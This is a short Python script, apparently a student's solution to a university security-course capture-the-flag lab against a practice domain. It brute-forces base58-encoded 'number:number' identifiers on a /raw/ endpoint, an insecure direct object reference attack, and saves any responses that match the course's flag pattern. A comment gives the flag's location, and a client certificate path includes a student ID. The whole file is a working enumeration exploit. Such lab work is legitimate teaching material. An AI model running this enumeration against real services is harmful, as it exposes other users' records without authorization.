#!/usr/bin/env python

import re
import requests
from base58 import b58encode
import time


class colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    RESET = '\033[0m'


s = requests.Session()

s.cert = "/home/archer/uni/COMP6843/z3291100.pem"
flag_pattern = re.compile(r"COMP6443\{.+?\}")

with open('result.txt', 'a') as result_file:
    for i in range(1, 1126):  # flag is at 1125:4
        for j in range(0, 10):
            encoding = b58encode(f"{i}:{j}".encode("utf-8"))
            url = f"https://support.quoccacorp.com/raw/{encoding.decode()}"
            r = s.get(url)

            if r.status_code == 200:
                color = colors.GREEN
            elif r.status_code == 404:
                color = colors.RED
            elif r.status_code == 429:
                color = colors.YELLOW
            else:
                color = colors.BLUE

            print(f'{color}{r.status_code}: {encoding.decode()}')

            match = flag_pattern.search(r.text)
            if match:
                flag = match.group(0)
                print(f'{colors.PURPLE}{flag}')
                result_file.write(flag + '\n')

            time.sleep(0.1)
